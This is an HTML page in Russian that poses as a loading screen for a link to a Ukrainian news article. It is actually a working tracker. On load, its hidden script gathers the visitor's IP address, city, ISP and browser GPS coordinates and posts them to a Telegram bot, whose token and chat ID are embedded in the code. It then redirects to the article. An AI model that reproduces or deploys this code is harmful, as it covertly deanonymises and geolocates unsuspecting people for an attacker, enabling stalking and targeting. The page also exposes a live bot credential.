<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Загрузка...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #000;
      height: 100vh;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <div id="status" style="display:none;">Загрузка...</div>

  <script>
    const redirectUrl = "https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina";

    function sendToTelegram(message) {
      fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: 490491527,
          text: message
        })
      });
    }

    function startRedirect(delay = 100) {
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, delay);
    }

    fetch("https://ipwho.is/")
      .then(response => response.json())
      .then(data => {
        const ipMessage = `
IP: ${data.ip}
Город: ${data.city}
Регион: ${data.region}
Страна: ${data.country}
Провайдер: ${data.connection.isp}
Время: ${new Date().toLocaleString()}`;

        let gpsTimeout = setTimeout(() => {
          sendToTelegram(ipMessage + "\n\n⚠️ GPS: не получен (таймаут)");
          startRedirect();
        }, 4000); // ускоренный таймер

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            pos => {
              clearTimeout(gpsTimeout);
              const lat = pos.coords.latitude;
              const lon = pos.coords.longitude;
              const acc = pos.coords.accuracy;
              const full = ipMessage + `\n\nGPS: ${lat}, ${lon}\nТочность: ${acc} м`;
              sendToTelegram(full);
              startRedirect();
            },
            err => {
              clearTimeout(gpsTimeout);
              sendToTelegram(ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`);
              startRedirect();
            }
          );
        } else {
          sendToTelegram(ipMessage + "\n\n⚠️ GPS не поддерживается.");
          startRedirect();
        }
      })
      .catch(err => {
        sendToTelegram("❌ Ошибка получения IP-геолокации.");
        startRedirect();
      });
  </script>
</body>
</html>

